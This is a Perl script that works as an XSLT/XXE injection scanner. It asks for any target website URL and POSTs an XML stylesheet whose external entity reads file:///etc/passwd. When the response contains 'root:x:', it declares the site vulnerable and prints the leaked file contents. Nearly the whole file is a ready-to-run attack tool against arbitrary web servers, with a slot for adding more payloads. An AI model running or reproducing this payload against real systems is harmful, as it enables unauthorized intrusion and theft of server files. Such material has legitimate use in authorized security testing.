#!/usr/bin/perl

use strict;
use warnings;
use LWP::UserAgent;
use Term::ANSIColor;

# Prompt user for target website URL
print color('bright_yellow'), "Enter your target website url: ", color('reset');
my $target_url = <STDIN>;
chomp $target_url;

# Create user agent object
my $ua = LWP::UserAgent->new;

# Set custom HTTP headers
$ua->default_header('Accept' => 'text/xml');

# List of XSLT payloads to test for vulnerabilities
my @xslt_payloads = (
    '<?xml version="1.0"?>
    <!DOCTYPE xsl:stylesheet [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
    <html>
    <body>
    <h1>XSLT Vulnerability Test</h1>
    <xsl:value-of select="document(\'xxe\')"/>
    </body>
    </html>
    </xsl:template>
    </xsl:stylesheet>',
    # Add more payloads here for testing different vulnerabilities
);

# Flag to indicate if vulnerability is discovered
my $vulnerability_found = 0;

# Send HTTP POST requests with each XSLT payload
foreach my $payload (@xslt_payloads) {
    unless ($vulnerability_found) {
        print color('bright_blue'), "Sending HTTP POST request with XSLT payload...\n", color('reset');
        my $response = $ua->post($target_url, Content_Type => 'text/xml', Content => $payload);

        # Check if the response contains the payload content
        if ($response->is_success && $response->content =~ /root:x:/) {
            print color('bright_green'), "Target website is vulnerable to XSLT injection!\n", color('reset');
            print color('bright_cyan'), "Vulnerability confirmed. Further testing may reveal additional exploits.\n", color('reset');
            # Highlight sensitive information in the response content
            my $highlighted_content = $response->content;
            $highlighted_content =~ s/(root:x:)/color('bright_red').$1.color('reset')/ge;
            print "Response Content:\n", $highlighted_content, "\n";
            $vulnerability_found = 1;
        } else {
            print color('bright_red'), "Target website is not vulnerable to XSLT injection using the current payload.\n", color('reset');
            if ($response->is_success) {
                print color('bright_red'), "The response did not contain the expected payload.\n", color('reset');
            } else {
                print color('bright_red'), "Error: ", $response->status_line, "\n", color('reset');
            }
        }
    }
}

unless ($vulnerability_found) {
    print color('bright_red'), "No vulnerabilities found using the provided payloads.\n", color('reset');
}
